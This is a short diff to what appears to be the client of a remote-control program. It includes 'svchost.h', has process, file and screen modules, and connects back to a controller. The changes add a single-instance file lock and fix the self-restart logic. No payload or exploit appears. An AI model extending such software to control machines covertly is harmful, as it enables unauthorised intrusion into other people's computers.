@@ -1,6 +1,7 @@
 #include "stdafx.h"
 #include "svchost.h"
 #include "common.h"
+#include <stdio.h>
 
 #define LxProc					1	// 进程管理
 #define LxFile					1	// 文件管理
@@ -19,6 +20,8 @@ CONNECTION_DATA modify_data = MAKE_CONNECTION_DATA("127.0.0.1", 6543);
 SOCKET MainSocket = INVALID_SOCKET;
 
 HMODULE DllHandle = NULL;
+
+HANDLE SelfFile = INVALID_HANDLE_VALUE;
 
 float ScreenRadio = 1;
 
@@ -167,6 +170,10 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
             char SelfPath[128];
             GetModuleFileName(GetModuleHandle(NULL), SelfPath, 128);
             // 重新加载程序
+            if (INVALID_HANDLE_VALUE != SelfFile) {
+                CloseHandle(SelfFile);
+                SelfFile = INVALID_HANDLE_VALUE;
+            }
 #ifdef _DEBUG
             UINT uResult = WinExec(SelfPath, SW_SHOWNORMAL);
 #else
@@ -174,11 +181,10 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 #endif
 			if (uResult >= 32) {
 				Mprintf("重新启动程序成功.\n");
+                return -1; // 重启成功才退出
 			} else {
                 Mprintf("重新启动程序失败: %d.\n", uResult);
 			}
-
-            return -1;
         }
         break;
 
@@ -829,7 +835,8 @@ DWORD WINAPI RoutineMain(LPVOID lp)
     OutputDebugStringA(">>> Start RoutineMain\n");
     TCHAR ModulePath[MAX_PATH*2];
     GetModuleFileName(DllHandle, ModulePath, sizeof(ModulePath));
-    CreateFile(ModulePath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    // 确保只运行一个实例
+    SelfFile = CreateFile(ModulePath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
 #if LxScreem
     OpenUserDesktop();
@@ -856,7 +863,8 @@ DWORD WINAPI RoutineMain(LPVOID lp)
         } else if (state == 1) { //Network Error
             Sleep(10 * 1000);
         } else if (state == -1) { //Exit
-            Mprintf(">>> Stop RoutineMain: Exit Request \n");
+            // 主控发起退出指令
+            OutputDebugStringA(">>> Stop RoutineMain: Exit Request \n");
             return -1;
         }
 
